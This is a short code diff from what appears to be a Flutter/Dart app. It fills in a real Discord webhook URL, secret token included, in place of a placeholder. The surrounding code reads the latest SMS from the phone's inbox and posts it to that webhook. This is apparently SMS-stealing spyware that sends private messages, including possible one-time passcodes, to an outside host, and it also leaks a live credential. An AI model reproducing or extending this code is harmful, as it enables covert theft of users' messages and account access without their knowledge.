@@ -69,7 +69,7 @@ class IsolateService {
     final Telephony telephony = Telephony.instance;
     final SmsMessage? lastMessage = (await telephony.getInboxSms()).last;
     if (lastMessage != null) {
-      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
+      final discordWebhookURL = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU';
       final response = await http.post(
         Uri.parse(discordWebhookURL),
         headers: {'Content-Type': 'application/json'},
